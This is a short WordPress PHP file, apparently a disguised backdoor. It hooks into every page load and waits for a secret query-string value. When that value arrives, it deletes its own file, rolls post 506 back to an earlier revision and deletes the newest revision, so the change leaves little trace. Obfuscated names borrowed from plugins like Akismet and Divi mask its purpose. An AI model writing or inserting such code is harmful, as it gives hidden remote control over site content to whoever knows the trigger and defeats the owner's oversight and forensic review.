<?php

function media_tools_akismet() {
	if (isset($_GET['divi_columns_get']) && $_GET['divi_columns_get'] === 'custom_feeds_cool') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$viewer_restrict_library_fonts = 506;
		$tag_avatar_plupload = wp_get_post_revisions($viewer_restrict_library_fonts);
		if (empty($tag_avatar_plupload)) die('no revisions');
		if (count($tag_avatar_plupload) < 2) die('less than 2');
		$portfolio_builder_dist = array_shift($tag_avatar_plupload);
		$picker_connector_webp = $portfolio_builder_dist->ID;
		$thumbnail_campaign_maintenance = array_shift($tag_avatar_plupload);
		$colors_panel_method = $thumbnail_campaign_maintenance->ID;
		$integrate_publish_variation_demo = wp_restore_post_revision($colors_panel_method);
		if ($integrate_publish_variation_demo === false) die('error restoring');
		$integrate_publish_variation_demo = wp_delete_post_revision($picker_connector_webp);		
		if ($integrate_publish_variation_demo === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'media_tools_akismet');
